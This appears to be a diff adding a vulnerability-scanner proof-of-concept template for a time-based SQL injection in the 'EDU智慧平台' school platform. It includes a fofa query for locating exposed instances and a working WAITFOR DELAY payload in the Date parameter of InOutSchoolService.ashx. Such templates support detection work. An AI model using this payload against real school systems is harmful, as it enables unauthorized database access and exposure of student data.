@@ -1,0 +1,25 @@
+id: poc-yaml-edu-system-personaldayinoutschooldata-sqli
+info:
+  name: EDU智慧平台 PersonalDayInOutSchoolData SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: EDU智慧平台
+  fofa: body="custom/blue/uimaker/easyui.css"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: '/ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--&AccountNo=1 '
+  expression: "status_code == 200 && \ncontains(find_json(body,\"code\"), \"200\"\
+    ) && \ncontains(find_json(body,\"msg\"), \"成功\") && \nduration >= t1 &&\nduration\
+    \ <= t2 &&\ncontains(find_json(body,\"total\"), \"0\")\n"
+- method: GET
+  path: '/ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t3}}%27--&AccountNo=1 '
+  expression: "status_code == 200 && \ncontains(find_json(body,\"code\"), \"200\"\
+    ) && \ncontains(find_json(body,\"msg\"), \"成功\") && \nduration >= t3 &&\nduration\
+    \ <= t4 &&\ncontains(find_json(body,\"total\"), \"0\")\n"
+transport: http
